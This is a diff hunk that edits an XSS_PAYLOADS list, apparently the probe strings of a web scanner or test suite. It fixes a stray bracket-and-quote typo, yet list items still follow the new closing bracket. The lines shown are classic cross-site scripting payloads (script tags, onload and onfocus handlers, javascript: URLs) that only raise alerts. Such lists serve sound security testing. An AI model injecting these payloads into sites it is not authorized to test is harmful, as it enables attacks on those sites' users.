@@ -80,7 +80,7 @@ XSS_PAYLOADS = [
     "<embed src=javascript:alert('XSS')>",
     "<form><button formaction=javascript:alert('XSS')>CLICK</button></form>",
     "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>"
-]",
+]
     "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
     "<body onload=alert('XSS')>",
     "<input onfocus=alert('XSS') autofocus>",
